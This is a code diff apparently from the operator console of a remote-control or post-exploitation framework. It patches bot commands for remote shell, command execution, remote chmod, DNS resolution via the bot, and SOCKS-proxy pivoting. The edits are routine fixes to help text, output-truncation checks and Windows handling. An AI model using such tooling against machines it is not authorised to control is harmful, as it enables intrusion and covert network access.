@@ -647,7 +647,10 @@ class Bot(object):
     @bot_action
     def system_fork(self):
         self.sock.sendall( build_command(CMD_SYSTEM_FORK) )
-        return str( UUID( bytes = get_resp_with_data(self.sock) ) )
+        bytes = get_resp_with_data(self.sock)
+        if bytes:
+            return str(UUID(bytes))
+        return
 
     @bot_action
     def system_shell(self):
@@ -692,7 +695,7 @@ class Bot(object):
     def dns_resolve(self, domain):
         self.sock.sendall( build_command(CMD_DNS_RESOLVE, domain) )
         response = get_resp_with_data(self.sock)
-        ##print " ".join("%02x" % ord(x) for x in response)   # XXX DEBUG
+        ##print(" ".join("%02x" % ord(x) for x in response))  # XXX DEBUG
         answer = []
         while response:
             family, = unpack("!B", response[0])
@@ -1664,9 +1667,9 @@ class Console(Cmd):
 
     def do_chmod(self, line):
         """
-    \x1b[32m\x1b[1mchmod\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m>
+    \x1b[32m\x1b[1mchmod\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m> <\x1b[34m\x1b[1mmode flags\x1b[0m>
 
-    Change a file's access mode flags.\n"""
+    Change a file's access mode flags. Mode flags are in octal.\n"""
 
         # A bot must be selected.
         if self.current is None:
@@ -1719,7 +1722,8 @@ class Console(Cmd):
     \x1b[32m\x1b[1mexec\x1b[0m <\x1b[34m\x1b[1mcommand line\x1b[0m>
 
     Execute a non interactive command.
-    The output of the command is limited to 1024 bytes.\n"""
+    The output of the command may be truncated if it exceeds memory usage.
+    This will be more noticeable on embedded platforms.\n"""
 
         # A bot must be selected.
         if self.current is None:
@@ -1734,9 +1738,10 @@ class Console(Cmd):
         # Perform the operation.
         output = self.current.file_exec(line)
 
-        # If the output is exactly 1023 bytes long,
-        # that means it was likely truncated.
-        if len(output) == 1023:
+        # If the output is exactly aligned to page size,
+        # that means it was likely truncated. Not an exact
+        # way to determine this, but it'll do.
+        if len(output) >= 1023 and ((len(output) + 1) & 0x03ff) == 0:
             output += "\n" + Fore.RED + Style.BRIGHT + "<output truncated>" + Style.RESET_ALL
 
         # Print the output from the command to screen.
@@ -2063,6 +2068,12 @@ class Console(Cmd):
 
             # Automatically fork the bot so we can keep using it.
             uuid = self.current.system_fork()
+
+            # If we didn't get the UUID, that means this is a Windows bot.
+            # Abort the operation since we don't support this yet on Windows.
+            if not uuid:
+                print(Fore.RED + "Error: feature not supported for this bot" + Style.RESET_ALL)
+                return
 
             # Create the SOCKSProxy.
             proxy = SOCKSProxy(self.listener, self.current.uuid, bind_addr, port, username, password)
